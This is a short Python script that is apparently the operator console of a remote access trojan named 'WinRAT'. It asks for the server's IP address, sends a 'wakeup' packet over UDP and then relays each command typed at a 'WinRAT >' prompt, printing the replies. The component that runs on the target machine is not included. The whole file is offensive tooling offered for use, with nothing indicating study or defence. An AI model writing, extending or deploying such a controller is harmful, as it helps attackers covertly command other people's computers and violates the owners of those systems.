import argparse
import socket


def send(message):
    port_no = 11000

    sock = socket.socket(socket.AF_INET,  # Internet
                         socket.SOCK_DGRAM)  # UDP
    sock.sendto(bytes(message, "ascii"), (ip_address, port_no))


def listen():
    port = 60789
    serversock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    serversock.bind((socket.gethostbyname(socket.gethostname()), port))

    data, addr = serversock.recvfrom(60789)
    print("Server > " + data.decode("utf-8"))


def main_system():
    send("wakeup")
    listen()

    while True:
        command = input("WinRAT > ")
        send(command)
        listen()


ip_address = input("Enter the WinRAT Server IP Address: ")


main_system()
